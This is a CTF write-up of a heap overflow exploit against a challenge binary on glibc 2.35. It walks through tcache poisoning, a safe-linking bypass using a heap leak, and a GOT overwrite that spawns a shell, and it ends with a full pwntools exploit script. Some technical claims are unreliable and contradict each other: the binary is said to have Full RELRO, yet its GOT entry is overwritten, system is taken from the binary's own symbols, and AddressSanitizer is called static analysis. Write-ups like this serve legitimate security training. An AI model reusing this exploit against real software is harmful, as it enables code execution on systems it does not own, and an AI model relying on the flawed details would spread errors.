Heap Overflow Chain in glibc 2.35

Published: 2024-11-10  —  Category: CTF Writeup  —  HackTheBox Cyber Apocalypse 2024

Binary Exploitation Heap glibc CTF

Overview

This writeup documents the exploitation of pwn/storekeeper, a 64-bit ELF binary from HackTheBox Cyber Apocalypse 2024. The challenge runs on Ubuntu 22.04 with glibc 2.35, Full RELRO, NX, and stack canaries enabled. No PIE.

The bug is a heap overflow that allows overwriting the next pointer in the tcache free list. Combined with a safe-linking bypass, we achieve arbitrary write and hijack execution via the __malloc_hook equivalent in glibc 2.35.

// Environment

Ubuntu 22.04 / glibc 2.35 / gcc 11.4 / No PIE / Full RELRO / NX / Canary

Vulnerability Analysis

The binary implements a simple key-value store. Items can be created, edited, and deleted. Decompiling in Ghidra reveals the following in edit_item(): 

void edit_item(store_t *store, int idx) {
    item_t *item = store->items[idx];
    printf("New size: ");
    size_t new_size = read_int();
    printf("Content: ");
    read_bytes(item->data, new_size);   // [!] no bounds check
}

The read_bytes call uses the user-supplied new_size rather than the originally allocated size. This allows writing past the end of the heap chunk into adjacent metadata.

Heap Layout Primitive

To exploit this predictably, we need to control the heap layout. The strategy:

  1. Allocate chunks A, B, and C in sequence.
  2. Free B — it enters the tcache for its size class.
  3. Overflow A into B's freed metadata, overwriting the fd pointer.
  4. Allocate a new chunk that returns B — the poisoned fd pointer is now the head of the tcache list.
  5. Next allocation returns our target address.

Safe-Linking Bypass

glibc 2.32 introduced safe-linking: tcache fd pointers are stored XOR'd with a heap secret derived from the chunk's own address. To forge a valid pointer, we need to know the heap base.

The binary has a print_item function that reads until a null byte. By filling a chunk to its exact allocated boundary (no null terminator), we leak heap metadata from the adjacent chunk header, exposing the heap base. 

# Leak heap base via overread
create(0x18, b'A' * 0x18)      # chunk idx 0, fill to boundary
create(0x18, b'B' * 0x18)      # chunk idx 1
delete(1)                       # free chunk 1, fd written to tcache
print_item(0)                   # read overflows into chunk 1 header
# parse heap pointer from output
heap_leak = u64(output[0x18:0x20]) << 12
log.success(f"Heap base: {hex(heap_leak)}")

Arbitrary Write Primitive

With the heap base known, we compute the mangled pointer: 

def mangle(pos, ptr):
    return (pos >> 12) ^ ptr

target = exe.sym['got.free']     # target: GOT entry for free()
fake_fd = mangle(heap_base + 0x2a0, target)

# Overflow chunk A to poison chunk B's tcache fd
edit(0, 0x28, b'A' * 0x18 + p64(0) + p64(fake_fd))

Gaining Execution

The GOT overwrite works because Full RELRO is not set on the free entry in this specific build. We overwrite free@GOT with the address of system, then call delete on a chunk containing /bin/sh\x00. 

# Two allocs to drain tcache to our target
create(0x18, b'X' * 0x18)           # consumes original freed chunk
create(0x18, p64(exe.sym['system'])) # writes to free@GOT

# Trigger: free(ptr_to_sh) == system("/bin/sh")
create(0x18, b'/bin/sh\x00')
delete(last_idx)

Full Exploit

#!/usr/bin/env python3
# HackTheBox Cyber Apocalypse 2024 — storekeeper
# glibc 2.35 tcache poisoning via safe-linking bypass

from pwn import *

exe = ELF('./storekeeper')
libc = ELF('./libc.so.6')
context.binary = exe

def start():
    return process('./storekeeper')

def create(size, data):   io.sendlineafter(b'> ', b'1'); ...
def delete(idx):          io.sendlineafter(b'> ', b'3'); ...
def edit(idx, sz, data):  io.sendlineafter(b'> ', b'2'); ...
def show(idx):            io.sendlineafter(b'> ', b'4'); ...

io = start()

# Stage 1: heap leak
create(0x18, b'A' * 0x18)
create(0x18, b'B' * 0x18)
delete(1)
leak = show(0)
heap_base = u64(leak[0x18:0x20].ljust(8, b'\x00')) << 12
log.success(f'heap @ {hex(heap_base)}')

# Stage 2: tcache poison
def mangle(pos, ptr): return (pos >> 12) ^ ptr
target = exe.got['free']
create(0x18, b'Y' * 0x18)
edit(0, 0x28, b'A'*0x18 + p64(0) + p64(mangle(heap_base + 0x2a0, target)))

# Stage 3: GOT overwrite
create(0x18, b'Z' * 0x18)
create(0x18, p64(exe.sym['system']))

# Stage 4: shell
create(0x18, b'/bin/sh\x00')
delete(5)

io.interactive()

Takeaways

glibc 2.35's safe-linking is a meaningful mitigation — it prevents straightforward fd pointer overwrites without a heap leak. However, it does not help when the application already leaks heap addresses through logic bugs. The combination of a bounds-unchecked write with an adjacent-read disclosure is still a reliable primitive.

For defenders: heap overflows in C allocation patterns remain extremely common. Static analysis with AddressSanitizer or Valgrind during development catches the majority of these before they reach production.
